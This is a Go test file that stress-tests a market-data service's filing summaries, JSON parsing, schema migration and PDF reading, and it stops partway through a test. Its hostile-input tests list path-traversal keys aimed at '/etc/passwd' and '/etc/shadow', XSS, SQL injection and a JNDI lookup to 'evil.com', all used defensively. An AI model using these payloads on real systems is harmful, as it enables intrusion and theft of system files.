package market

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/bobmcallan/vire/internal/common"
	"github.com/bobmcallan/vire/internal/models"
)

// ============================================================================
// Prompt Hash Stability & Collision
// ============================================================================

// 1. Prompt hash is deterministic across calls
func TestStressPromptHash_Deterministic(t *testing.T) {
	hashes := make(map[string]bool)
	for i := 0; i < 100; i++ {
		h := filingSummaryPromptHash()
		hashes[h] = true
	}
	if len(hashes) != 1 {
		t.Errorf("prompt hash not deterministic — got %d distinct values", len(hashes))
	}
}

// 2. Prompt hash is a valid SHA-256 hex string
func TestStressPromptHash_ValidSHA256(t *testing.T) {
	h := filingSummaryPromptHash()

	if len(h) != 64 {
		t.Errorf("hash length = %d, want 64 (SHA-256 hex)", len(h))
	}

	// Should be valid hex
	if _, err := hex.DecodeString(h); err != nil {
		t.Errorf("hash is not valid hex: %v", err)
	}
}

// 3. Verify hash matches manual computation (no hidden salt)
func TestStressPromptHash_MatchesManual(t *testing.T) {
	expected := sha256.Sum256([]byte(filingSummaryPromptTemplate))
	expectedHex := hex.EncodeToString(expected[:])

	got := filingSummaryPromptHash()
	if got != expectedHex {
		t.Errorf("hash mismatch: got %s, want %s", got, expectedHex)
	}
}

// 4. Template contains the new financial_summary and performance_commentary fields
func TestStressPromptTemplate_ContainsNewFields(t *testing.T) {
	if !strings.Contains(filingSummaryPromptTemplate, "financial_summary") {
		t.Error("prompt template missing financial_summary field")
	}
	if !strings.Contains(filingSummaryPromptTemplate, "performance_commentary") {
		t.Error("prompt template missing performance_commentary field")
	}
}

// ============================================================================
// CollectFilingSummaries — Prompt Hash Change Detection
// ============================================================================

// 5. CollectFilingSummaries detects prompt hash mismatch and forces regeneration
func TestStressCollectFilingSummaries_PromptHashMismatch(t *testing.T) {
	now := time.Now()

	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"SKS.AU": {
					Ticker:   "SKS.AU",
					Exchange: "AU",
					Filings: []models.CompanyFiling{
						{Date: now, Headline: "Full Year Results", PriceSensitive: true, Relevance: "HIGH", DocumentKey: "001"},
					},
					FilingSummaries: []models.FilingSummary{
						{Date: now, Headline: "Full Year Results", Type: "financial_results"},
					},
					FilingSummaryPromptHash:  "old_hash_that_does_not_match",
					FilingSummariesUpdatedAt: now,
					DataVersion:              common.SchemaVersion,
				},
			},
		},
		signals: &mockSignalStorage{},
	}

	// Gemini mock that verifies summaries were cleared (force=true)
	// The summarizeNewFilings call will see 0 existing summaries
	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	// This will try to call Gemini (nil) but gemini==nil check returns nil early
	err := svc.CollectFilingSummaries(context.Background(), "SKS.AU", false)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Even though gemini is nil, the force flag should have been set internally
	// The implementation sets force=true, which clears FilingSummaries before calling summarizeNewFilings
	// Since gemini is nil, the method returns nil, and no new summaries are generated
	// We need a gemini mock to fully test this

	// At minimum, verify the hash mismatch was detected by checking that
	// with gemini=nil the function still returns without error
}

// ============================================================================
// parseFilingSummaryResponse — Hostile Inputs
// ============================================================================

// 6. Empty JSON array
func TestStressFilingParse_EmptyArray(t *testing.T) {
	summaries := parseFilingSummaryResponse("[]", nil)
	if len(summaries) != 0 {
		t.Errorf("expected 0 summaries for empty array, got %d", len(summaries))
	}
}

// 7. Deeply nested/malicious JSON
func TestStressFilingParse_MaliciousJSON(t *testing.T) {
	// Deeply nested braces — should not stack overflow
	malicious := strings.Repeat("[", 1000) + strings.Repeat("]", 1000)
	summaries := parseFilingSummaryResponse(malicious, nil)
	// Should return nil (parse error), not crash
	if summaries != nil {
		t.Logf("NOTE: deeply nested JSON parsed as %d items", len(summaries))
	}
}

// 8. JSON with extra unknown fields — should be ignored gracefully
func TestStressFilingParse_ExtraFields(t *testing.T) {
	response := `[{
		"type": "financial_results",
		"revenue": "$100M",
		"unknown_field": "should be ignored",
		"nested": {"deep": true},
		"key_facts": ["Test fact"],
		"financial_summary": "Test summary",
		"performance_commentary": "Test commentary"
	}]`

	batch := []models.CompanyFiling{
		{Date: time.Now(), Headline: "Test", DocumentKey: "001"},
	}

	summaries := parseFilingSummaryResponse(response, batch)
	if len(summaries) != 1 {
		t.Fatalf("expected 1 summary, got %d", len(summaries))
	}
	if summaries[0].Revenue != "$100M" {
		t.Errorf("revenue = %s, want $100M", summaries[0].Revenue)
	}
	if summaries[0].FinancialSummary != "Test summary" {
		t.Errorf("financial_summary = %s, want 'Test summary'", summaries[0].FinancialSummary)
	}
}

// 9. JSON with null values for string fields
func TestStressFilingParse_NullValues(t *testing.T) {
	response := `[{
		"type": null,
		"revenue": null,
		"key_facts": null,
		"financial_summary": null,
		"performance_commentary": null
	}]`

	batch := []models.CompanyFiling{
		{Date: time.Now(), Headline: "Test"},
	}

	summaries := parseFilingSummaryResponse(response, batch)
	if len(summaries) != 1 {
		t.Fatalf("expected 1 summary, got %d", len(summaries))
	}
	// Null should map to zero values (empty string, nil slice)
	if summaries[0].Type != "" {
		t.Errorf("type should be empty string for null, got %q", summaries[0].Type)
	}
}

// 10. Very large key_facts array
func TestStressFilingParse_LargeKeyFacts(t *testing.T) {
	var facts []string
	for i := 0; i < 1000; i++ {
		facts = append(facts, fmt.Sprintf("Fact #%d with some detail about $%dM revenue", i, i*10))
	}

	factsJSON := `["`
	for i, f := range facts {
		if i > 0 {
			factsJSON += `","`
		}
		factsJSON += f
	}
	factsJSON += `"]`

	response := fmt.Sprintf(`[{"type":"financial_results","key_facts":%s}]`, factsJSON)
	batch := []models.CompanyFiling{{Date: time.Now(), Headline: "Test"}}

	summaries := parseFilingSummaryResponse(response, batch)
	if len(summaries) != 1 {
		t.Fatalf("expected 1 summary, got %d", len(summaries))
	}

	// All 1000 facts should be parsed (no enforced limit at parse level)
	if len(summaries[0].KeyFacts) != 1000 {
		t.Errorf("key_facts count = %d, want 1000", len(summaries[0].KeyFacts))
	}
}

// 11. Unicode and special characters in financial data
func TestStressFilingParse_UnicodeFields(t *testing.T) {
	response := `[{
		"type": "financial_results",
		"revenue": "¥26.17億",
		"profit": "€14.0M — net profit",
		"key_facts": ["Revenue ¥26.17億 (+92%)", "利益 doubled to ¥14.0億"],
		"financial_summary": "Revenue grew 92% to ¥26.17億 with net profit doubling",
		"performance_commentary": "経営陣は力強い需要を指摘"
	}]`

	batch := []models.CompanyFiling{
		{Date: time.Now(), Headline: "Test Unicode"},
	}

	summaries := parseFilingSummaryResponse(response, batch)
	if len(summaries) != 1 {
		t.Fatalf("expected 1 summary, got %d", len(summaries))
	}
	if summaries[0].Revenue != "¥26.17億" {
		t.Errorf("revenue = %q, want ¥26.17億", summaries[0].Revenue)
	}
}

// 12. Batch is nil but response has items
func TestStressFilingParse_NilBatch(t *testing.T) {
	response := `[{"type":"other","key_facts":["test"]}]`
	summaries := parseFilingSummaryResponse(response, nil)
	// Should return 0 summaries since batch is nil (i >= len(batch) check)
	if len(summaries) != 0 {
		t.Errorf("expected 0 summaries when batch is nil, got %d", len(summaries))
	}
}

// 13. Empty batch but response has items
func TestStressFilingParse_EmptyBatch(t *testing.T) {
	response := `[{"type":"other","key_facts":["test"]}]`
	summaries := parseFilingSummaryResponse(response, []models.CompanyFiling{})
	if len(summaries) != 0 {
		t.Errorf("expected 0 summaries for empty batch, got %d", len(summaries))
	}
}

// ============================================================================
// Filing Summary Key — Edge Cases
// ============================================================================

// 14. Filing summary key with empty headline
func TestStressFilingSummaryKey_EmptyHeadline(t *testing.T) {
	date := time.Date(2025, 8, 20, 0, 0, 0, 0, time.UTC)
	key := filingSummaryKey("doc123", date, "")
	expected := "2025-08-20|"
	if key != expected {
		t.Errorf("key = %q, want %q", key, expected)
	}
}

// 15. Filing summary key with special characters in headline
func TestStressFilingSummaryKey_SpecialChars(t *testing.T) {
	date := time.Date(2025, 8, 20, 0, 0, 0, 0, time.UTC)
	headline := "Results: $261.7M Revenue (+92%) | Net Profit $14.0M"
	key := filingSummaryKey("", date, headline)
	expected := "2025-08-20|" + headline
	if key != expected {
		t.Errorf("key = %q, want %q", key, expected)
	}
}

// ============================================================================
// summarizeNewFilings — Edge Cases
// ============================================================================

// 16. All filings are LOW/NOISE relevance — should skip all
func TestStressSummarizeNewFilings_AllNoiseRelevance(t *testing.T) {
	filings := []models.CompanyFiling{
		{Date: time.Now(), Headline: "Change of Address", Relevance: "NOISE"},
		{Date: time.Now(), Headline: "Company Secretary Update", Relevance: "LOW"},
	}

	svc := &Service{storage: &mockStorageManager{}}
	summaries, changed := svc.summarizeNewFilings(context.Background(), "TEST.AU", filings, nil, nil)
	if changed {
		t.Error("should not change when all filings are noise/low")
	}
	if len(summaries) != 0 {
		t.Errorf("expected 0 summaries, got %d", len(summaries))
	}
}

// 17. Duplicate filings with same date+headline
func TestStressSummarizeNewFilings_DuplicateFilings(t *testing.T) {
	now := time.Now()
	existing := []models.FilingSummary{
		{Date: now, Headline: "Full Year Results", Type: "financial_results", DocumentKey: "001"},
	}

	filings := []models.CompanyFiling{
		// Same date+headline as existing — should not re-summarize
		{Date: now, Headline: "Full Year Results", Relevance: "HIGH", DocumentKey: "001"},
		// Same date+headline again
		{Date: now, Headline: "Full Year Results", Relevance: "HIGH", DocumentKey: "002"},
	}

	svc := &Service{storage: &mockStorageManager{}}
	summaries, changed := svc.summarizeNewFilings(context.Background(), "TEST.AU", filings, existing, nil)
	if changed {
		t.Error("should not re-summarize existing filings")
	}
	if len(summaries) != 1 {
		t.Errorf("expected 1 summary (existing), got %d", len(summaries))
	}
}

// ============================================================================
// Schema Version Migration
// ============================================================================

// 18. Schema version bump from "5" to "6" clears old data
func TestStressSchemaVersion_MigrationClears(t *testing.T) {
	now := time.Now()

	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"OLD.AU": {
					Ticker:                   "OLD.AU",
					Exchange:                 "AU",
					DataVersion:              "5", // old schema
					EODUpdatedAt:             now,
					FundamentalsUpdatedAt:    now,
					FilingsIndexUpdatedAt:    now,
					FilingSummariesUpdatedAt: now,
					CompanyTimelineUpdatedAt: now,
					EOD:                      []models.EODBar{{Date: now, Close: 10}},
					FilingSummaries:          []models.FilingSummary{{Date: now, Headline: "Old Summary"}},
					CompanyTimeline:          &models.CompanyTimeline{BusinessModel: "Old model"},
					FilingSummaryPromptHash:  "old_hash",
				},
			},
		},
		signals: &mockSignalStorage{},
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, &mockEODHDClient{}, nil, logger)

	err := svc.CollectMarketData(context.Background(), []string{"OLD.AU"}, false, false)
	if err != nil {
		t.Fatalf("CollectMarketData failed: %v", err)
	}

	saved := storage.market.data["OLD.AU"]

	// Schema mismatch should clear derived data
	if saved.FilingSummaries != nil {
		t.Errorf("FilingSummaries should be nil after schema mismatch, got %d", len(saved.FilingSummaries))
	}
	if saved.CompanyTimeline != nil {
		t.Error("CompanyTimeline should be nil after schema mismatch")
	}
	if saved.DataVersion != common.SchemaVersion {
		t.Errorf("DataVersion = %q, want %q", saved.DataVersion, common.SchemaVersion)
	}
}

// 19. Schema version "6" data is preserved (no migration needed)
func TestStressSchemaVersion_CurrentPreserved(t *testing.T) {
	now := time.Now()

	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"CUR.AU": {
					Ticker:                   "CUR.AU",
					Exchange:                 "AU",
					DataVersion:              common.SchemaVersion,
					EODUpdatedAt:             now,
					FundamentalsUpdatedAt:    now,
					FilingsIndexUpdatedAt:    now,
					FilingSummariesUpdatedAt: now,
					CompanyTimelineUpdatedAt: now,
					EOD:                      []models.EODBar{{Date: now, Close: 10}},
					FilingSummaries:          []models.FilingSummary{{Date: now, Headline: "Current"}},
					CompanyTimeline:          &models.CompanyTimeline{BusinessModel: "Current model"},
				},
			},
		},
		signals: &mockSignalStorage{},
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, &mockEODHDClient{}, nil, logger)

	err := svc.CollectMarketData(context.Background(), []string{"CUR.AU"}, false, false)
	if err != nil {
		t.Fatalf("CollectMarketData failed: %v", err)
	}

	saved := storage.market.data["CUR.AU"]
	if len(saved.FilingSummaries) != 1 {
		t.Errorf("FilingSummaries should be preserved, got %d", len(saved.FilingSummaries))
	}
	if saved.CompanyTimeline == nil {
		t.Error("CompanyTimeline should be preserved")
	}
}

// ============================================================================
// Route Parsing — Filing Summaries Endpoint
// ============================================================================

// 20. routeMarketStocks suffix extraction edge cases
func TestStressRoute_FilingSummariesSuffix(t *testing.T) {
	tests := []struct {
		path     string
		isFiling bool
		ticker   string
	}{
		// Standard case
		{"BHP.AU/filing-summaries", true, "BHP.AU"},
		// Ticker with hyphens
		{"BHP-GROUP.AU/filing-summaries", true, "BHP-GROUP.AU"},
		// Ticker with dots
		{"BHP.AU/filing-summaries", true, "BHP.AU"},
		// No suffix — falls through to stock handler
		{"BHP.AU", false, ""},
		// FINDING: Double suffix is incorrectly matched by HasSuffix — routes to
		// handleFilingSummaries with ticker "BHP.AU/filing-summaries" which will
		// fail validateTicker. Not a security issue but returns confusing error.
		{"BHP.AU/filing-summaries/filing-summaries", true, "BHP.AU/filing-summaries"},
		// Trailing slash — not matched by HasSuffix
		{"BHP.AU/filing-summaries/", false, ""},
	}

	for _, tt := range tests {
		hasSuffix := strings.HasSuffix(tt.path, "/filing-summaries")
		if hasSuffix != tt.isFiling {
			t.Errorf("path %q: HasSuffix(/filing-summaries) = %v, want %v", tt.path, hasSuffix, tt.isFiling)
			continue
		}

		if tt.isFiling {
			ticker := strings.TrimSuffix(tt.path, "/filing-summaries")
			if ticker != tt.ticker {
				t.Errorf("path %q: ticker = %q, want %q", tt.path, ticker, tt.ticker)
			}
		}
	}
}

// ============================================================================
// buildFilingSummaryPrompt — Edge Cases
// ============================================================================

// 22. Prompt with empty batch should not panic
func TestStressPrompt_EmptyBatch(t *testing.T) {
	svc := &Service{storage: &mockStorageManager{}}

	// Should not panic
	prompt := svc.buildFilingSummaryPrompt("TEST.AU", nil)
	if prompt == "" {
		t.Error("expected non-empty prompt even for nil batch")
	}
	if !strings.Contains(prompt, "0 objects") {
		t.Errorf("prompt should indicate 0 objects for empty batch")
	}
}

// 23. Prompt with filing containing very long headline
func TestStressPrompt_LongHeadline(t *testing.T) {
	longHeadline := strings.Repeat("A", 10000)
	batch := []models.CompanyFiling{
		{Date: time.Now(), Headline: longHeadline, Relevance: "HIGH"},
	}

	svc := &Service{storage: &mockStorageManager{}}
	prompt := svc.buildFilingSummaryPrompt("TEST.AU", batch)

	// Should contain the headline without truncation at build time
	if !strings.Contains(prompt, longHeadline) {
		t.Error("prompt should contain the full headline")
	}
}

// ============================================================================
// parseFilingSummaryResponse — new fields wiring
// ============================================================================

// 24. Verify FinancialSummary and PerformanceCommentary are correctly wired
func TestStressFilingParse_NewFieldsWiring(t *testing.T) {
	response := `[{
		"type": "financial_results",
		"revenue": "$100M",
		"financial_summary": "Revenue grew 50% to $100M",
		"performance_commentary": "Strong demand in data centres",
		"key_facts": ["Revenue $100M"]
	}]`

	batch := []models.CompanyFiling{
		{Date: time.Date(2025, 8, 20, 0, 0, 0, 0, time.UTC), Headline: "FY Results", DocumentKey: "001"},
	}

	summaries := parseFilingSummaryResponse(response, batch)
	if len(summaries) != 1 {
		t.Fatalf("expected 1 summary, got %d", len(summaries))
	}

	s := summaries[0]
	if s.FinancialSummary != "Revenue grew 50% to $100M" {
		t.Errorf("FinancialSummary = %q", s.FinancialSummary)
	}
	if s.PerformanceCommentary != "Strong demand in data centres" {
		t.Errorf("PerformanceCommentary = %q", s.PerformanceCommentary)
	}

	// Verify metadata from batch is preserved
	if s.Date != batch[0].Date {
		t.Errorf("Date = %v, want %v", s.Date, batch[0].Date)
	}
	if s.Headline != "FY Results" {
		t.Errorf("Headline = %q, want FY Results", s.Headline)
	}
	if s.DocumentKey != "001" {
		t.Errorf("DocumentKey = %q, want 001", s.DocumentKey)
	}
}

// 25. Response with missing new fields — backward compatibility
func TestStressFilingParse_MissingNewFields(t *testing.T) {
	// Simulate old Gemini response without the new fields
	response := `[{
		"type": "financial_results",
		"revenue": "$100M",
		"key_facts": ["Revenue $100M"]
	}]`

	batch := []models.CompanyFiling{
		{Date: time.Now(), Headline: "Test"},
	}

	summaries := parseFilingSummaryResponse(response, batch)
	if len(summaries) != 1 {
		t.Fatalf("expected 1 summary, got %d", len(summaries))
	}

	// Missing fields should be empty strings (Go zero values)
	if summaries[0].FinancialSummary != "" {
		t.Errorf("FinancialSummary should be empty for old responses, got %q", summaries[0].FinancialSummary)
	}
	if summaries[0].PerformanceCommentary != "" {
		t.Errorf("PerformanceCommentary should be empty for old responses, got %q", summaries[0].PerformanceCommentary)
	}
}

// ============================================================================
// ReadFiling — Security, Failure Modes, Edge Cases, Hostile Inputs
// ============================================================================

// 26. Path traversal in document_key — should never match a stored filing
func TestStress_ReadFiling_PathTraversalDocKey(t *testing.T) {
	now := time.Now()
	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"BHP.AU": {
					Ticker: "BHP.AU",
					Filings: []models.CompanyFiling{
						{DocumentKey: "03063826", PDFPath: "BHP/20250820-03063826.pdf", Date: now, Headline: "Results"},
					},
				},
			},
		},
		signals: &mockSignalStorage{},
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	traversalKeys := []string{
		"../../etc/passwd",
		"../../../etc/shadow",
		"..%2F..%2Fetc%2Fpasswd",
		"BHP/../../../etc/passwd",
		"/etc/passwd",
		"03063826/../../secrets",
		"../other_category/key",
		"../filing_pdf/../internal/key",
		"....//....//etc/passwd",
		"..\\..\\etc\\passwd",
		"03063826\x00injected",
	}

	for _, key := range traversalKeys {
		_, err := svc.ReadFiling(context.Background(), "BHP.AU", key)
		if err == nil {
			t.Errorf("path traversal key %q should return error, got nil", key)
		}
		if !strings.Contains(err.Error(), "not found") {
			t.Errorf("path traversal key %q should return 'not found' error, got: %v", key, err)
		}
	}
}

// 27. Very long document_key
func TestStress_ReadFiling_VeryLongDocumentKey(t *testing.T) {
	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"BHP.AU": {
					Ticker:  "BHP.AU",
					Filings: []models.CompanyFiling{},
				},
			},
		},
		signals: &mockSignalStorage{},
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	longKey := strings.Repeat("A", 100_000)
	_, err := svc.ReadFiling(context.Background(), "BHP.AU", longKey)
	if err == nil {
		t.Error("expected error for very long document_key")
	}
	if !strings.Contains(err.Error(), "not found") {
		t.Errorf("expected 'not found' error, got: %v", err)
	}
}

// 28. Missing market data for ticker
func TestStress_ReadFiling_NonexistentTicker(t *testing.T) {
	storage := &mockStorageManager{
		market:  &mockMarketDataStorage{data: map[string]*models.MarketData{}},
		signals: &mockSignalStorage{},
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	_, err := svc.ReadFiling(context.Background(), "NONEXIST.AU", "03063826")
	if err == nil {
		t.Error("expected error for nonexistent ticker")
	}
	if !strings.Contains(err.Error(), "not found") {
		t.Errorf("expected 'not found' in error, got: %v", err)
	}
}

// 29. Filing exists but PDFPath is empty
func TestStress_ReadFiling_NoPDFDownloaded(t *testing.T) {
	now := time.Now()
	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"BHP.AU": {
					Ticker: "BHP.AU",
					Filings: []models.CompanyFiling{
						{DocumentKey: "03063826", PDFPath: "", Date: now, Headline: "No PDF"},
					},
				},
			},
		},
		signals: &mockSignalStorage{},
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	_, err := svc.ReadFiling(context.Background(), "BHP.AU", "03063826")
	if err == nil {
		t.Error("expected error when PDF not downloaded")
	}
	if !strings.Contains(err.Error(), "not downloaded") {
		t.Errorf("error should mention PDF not downloaded, got: %v", err)
	}
}

// 30. FileStore returns error (file missing from storage)
func TestStress_ReadFiling_FileStoreMissingFile(t *testing.T) {
	now := time.Now()
	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"BHP.AU": {
					Ticker: "BHP.AU",
					Filings: []models.CompanyFiling{
						{DocumentKey: "03063826", PDFPath: "BHP/20250820-03063826.pdf", Date: now, Headline: "Results"},
					},
				},
			},
		},
		signals: &mockSignalStorage{},
		files:   &mockFileStore{files: make(map[string][]byte)},
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	_, err := svc.ReadFiling(context.Background(), "BHP.AU", "03063826")
	if err == nil {
		t.Error("expected error when file not in FileStore")
	}
	if !strings.Contains(err.Error(), "failed to read PDF file") {
		t.Errorf("error should mention failed to read PDF, got: %v", err)
	}
}

// 31. Corrupt PDF data — should not panic
func TestStress_ReadFiling_CorruptPDFData(t *testing.T) {
	now := time.Now()
	files := &mockFileStore{files: map[string][]byte{
		"filing_pdf/BHP/20250820-03063826.pdf": []byte("not a valid PDF at all"),
	}}
	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"BHP.AU": {
					Ticker: "BHP.AU",
					Filings: []models.CompanyFiling{
						{DocumentKey: "03063826", PDFPath: "BHP/20250820-03063826.pdf", Date: now, Headline: "Results"},
					},
				},
			},
		},
		signals: &mockSignalStorage{},
		files:   files,
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	_, err := svc.ReadFiling(context.Background(), "BHP.AU", "03063826")
	if err == nil {
		t.Log("NOTE: Corrupt PDF did not return error — ExtractPDFTextFromBytes may return empty text instead")
	}
}

// 32. Zero-byte PDF
func TestStress_ReadFiling_ZeroBytePDF(t *testing.T) {
	now := time.Now()
	files := &mockFileStore{files: map[string][]byte{
		"filing_pdf/BHP/20250820-03063826.pdf": {},
	}}
	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"BHP.AU": {
					Ticker: "BHP.AU",
					Filings: []models.CompanyFiling{
						{DocumentKey: "03063826", PDFPath: "BHP/20250820-03063826.pdf", Date: now, Headline: "Results"},
					},
				},
			},
		},
		signals: &mockSignalStorage{},
		files:   files,
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	_, err := svc.ReadFiling(context.Background(), "BHP.AU", "03063826")
	if err == nil {
		t.Error("expected error for zero-byte PDF")
	}
}

// 33. Error information leakage
func TestStress_ReadFiling_ErrorInfoLeakage(t *testing.T) {
	now := time.Now()
	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"BHP.AU": {
					Ticker: "BHP.AU",
					Filings: []models.CompanyFiling{
						{DocumentKey: "03063826", PDFPath: "BHP/20250820-03063826.pdf", Date: now, Headline: "Results"},
					},
				},
			},
		},
		signals: &mockSignalStorage{},
		files:   &mockFileStore{files: make(map[string][]byte)},
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	_, err := svc.ReadFiling(context.Background(), "BHP.AU", "03063826")
	if err != nil {
		errMsg := err.Error()
		if strings.Contains(errMsg, "/tmp/") {
			t.Errorf("error exposes temp file path: %s", errMsg)
		}
		if strings.Contains(errMsg, "data/") && strings.Contains(errMsg, "filing_pdf") {
			t.Errorf("error exposes internal storage path: %s", errMsg)
		}
	}

	_, err = svc.ReadFiling(context.Background(), "NOPE.AU", "12345")
	if err != nil {
		errMsg := err.Error()
		if strings.Contains(errMsg, "surrealdb") || strings.Contains(errMsg, "badger") {
			t.Errorf("error exposes storage backend: %s", errMsg)
		}
	}
}

// 34. Special characters in document_key — no panics
func TestStress_ReadFiling_SpecialCharsInDocKey(t *testing.T) {
	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"BHP.AU": {
					Ticker:  "BHP.AU",
					Filings: []models.CompanyFiling{},
				},
			},
		},
		signals: &mockSignalStorage{},
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	specialKeys := []string{
		"<script>alert(1)</script>",
		"'; DROP TABLE filings; --",
		"${jndi:ldap://evil.com/x}",
		"\x00\x01\x02\x03",
		string([]byte{0xff, 0xfe, 0xfd}),
		"key with spaces",
		"key\nwith\nnewlines",
		"key\twith\ttabs",
		"%00%01%02",
		"key&param=val",
		"key#fragment",
		"key?query=1",
	}

	for _, key := range specialKeys {
		_, err := svc.ReadFiling(context.Background(), "BHP.AU", key)
		if err == nil {
			t.Errorf("special char key %q should return error (no matching filing), got nil", key)
		}
	}
}

// 35. Concurrent ReadFiling calls — no data races or panics
func TestStress_ReadFiling_ConcurrentReads(t *testing.T) {
	now := time.Now()
	pdfData := []byte("%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R>>endobj\nxref\n0 4\ntrailer<</Root 1 0 R/Size 4>>\nstartxref\n0\n%%EOF")

	files := &mockFileStore{files: map[string][]byte{
		"filing_pdf/BHP/001.pdf": pdfData,
		"filing_pdf/BHP/002.pdf": pdfData,
		"filing_pdf/BHP/003.pdf": pdfData,
	}}
	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"BHP.AU": {
					Ticker: "BHP.AU",
					Filings: []models.CompanyFiling{
						{DocumentKey: "001", PDFPath: "BHP/001.pdf", Date: now, Headline: "Filing 1"},
						{DocumentKey: "002", PDFPath: "BHP/002.pdf", Date: now, Headline: "Filing 2"},
						{DocumentKey: "003", PDFPath: "BHP/003.pdf", Date: now, Headline: "Filing 3"},
					},
				},
			},
		},
		signals: &mockSignalStorage{},
		files:   files,
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	var wg sync.WaitGroup
	errs := make([]error, 30)

	for i := 0; i < 30; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			docKey := fmt.Sprintf("00%d", (idx%3)+1)
			_, err := svc.ReadFiling(context.Background(), "BHP.AU", docKey)
			errs[idx] = err
		}(i)
	}

	wg.Wait()

	failures := 0
	for _, err := range errs {
		if err != nil {
			failures++
		}
	}
	t.Logf("Concurrent reads: %d succeeded, %d failed (PDF parse failures acceptable)", 30-failures, failures)
}

// 36. Temp file cleanup in ExtractPDFTextFromBytes
func TestStress_ExtractPDFTextFromBytes_TempFileCleanup(t *testing.T) {
	tempDir := os.TempDir()
	beforeFiles, _ := os.ReadDir(tempDir)
	beforeCount := countVirePDFTempFiles(beforeFiles)

	for i := 0; i < 10; i++ {
		ExtractPDFTextFromBytes([]byte("corrupt pdf data " + fmt.Sprint(i)))
	}

	afterFiles, _ := os.ReadDir(tempDir)
	afterCount := countVirePDFTempFiles(afterFiles)

	leaked := afterCount - beforeCount
	if leaked > 0 {
		t.Errorf("temp file leak: %d vire-pdf temp files not cleaned up after extraction", leaked)
	}
}

func countVirePDFTempFiles(entries []os.DirEntry) int {
	count := 0
	for _, e := range entries {
		if strings.HasPrefix(e.Name(), "vire-pdf-") {
			count++
		}
	}
	return count
}

// 37. Temp file cleanup in countPDFPages
func TestStress_CountPDFPages_TempFileCleanup(t *testing.T) {
	tempDir := os.TempDir()
	beforeFiles, _ := os.ReadDir(tempDir)
	beforeCount := countVirePDFCountTempFiles(beforeFiles)

	for i := 0; i < 10; i++ {
		countPDFPages([]byte("not a pdf " + fmt.Sprint(i)))
	}

	afterFiles, _ := os.ReadDir(tempDir)
	afterCount := countVirePDFCountTempFiles(afterFiles)

	leaked := afterCount - beforeCount
	if leaked > 0 {
		t.Errorf("temp file leak: %d vire-pdf-count temp files not cleaned up", leaked)
	}
}

func countVirePDFCountTempFiles(entries []os.DirEntry) int {
	count := 0
	for _, e := range entries {
		if strings.HasPrefix(e.Name(), "vire-pdf-count-") {
			count++
		}
	}
	return count
}

// 38. ReadFiling with nil market data stored
func TestStress_ReadFiling_NilMarketData(t *testing.T) {
	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"BHP.AU": nil,
			},
		},
		signals: &mockSignalStorage{},
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	_, err := svc.ReadFiling(context.Background(), "BHP.AU", "03063826")
	if err == nil {
		t.Error("expected error for nil market data")
	}
}

// 39. ReadFiling with nil filings list
func TestStress_ReadFiling_EmptyFilingsList(t *testing.T) {
	storage := &mockStorageManager{
		market: &mockMarketDataStorage{
			data: map[string]*models.MarketData{
				"BHP.AU": {
					Ticker:  "BHP.AU",
					Filings: nil,
				},
			},
		},
		signals: &mockSignalStorage{},
	}

	logger := common.NewLogger("error")
	svc := NewService(storage, nil, nil, logger)

	_, err := svc.ReadFiling(context.Background(), "BHP.AU", "03063826")
	if err == nil {
		t.Error("expected error for empty filings list")
	}
	if !strings.Contains(err.Error(), "not found") {
		t.Errorf("expected 'not found' error, got: %v", err)
	}
}

// 40. ReadFiling with 10k filings — linear scan performance
func TestStress_ReadFiling_ManyFilings(t *testing.T) {
	now := time.Now()
	filings := make([]models.CompanyFiling, 10_000)
	for i := range filings {
		filings[i] = models.CompanyFiling{
			DocumentKey: fmt.Sprintf("DOC%07d", i),
			PDFPath:     fmt.Sprintf("BHP/%07d.pdf", i),
			Date:        now.AddDate(0, 0, -i),
			Headline:    fmt.Sprintf("Filing %d", i),
		}
	}
	filings[9999].DocumentKey = "TARGET"

	files := &mockFileStore{files: map[string][]byte{
		"filing_pdf/BHP/0009999.pdf": []byte("%PDF-1.4 minimal"),
	}}
	storage := &mockStorageManager{
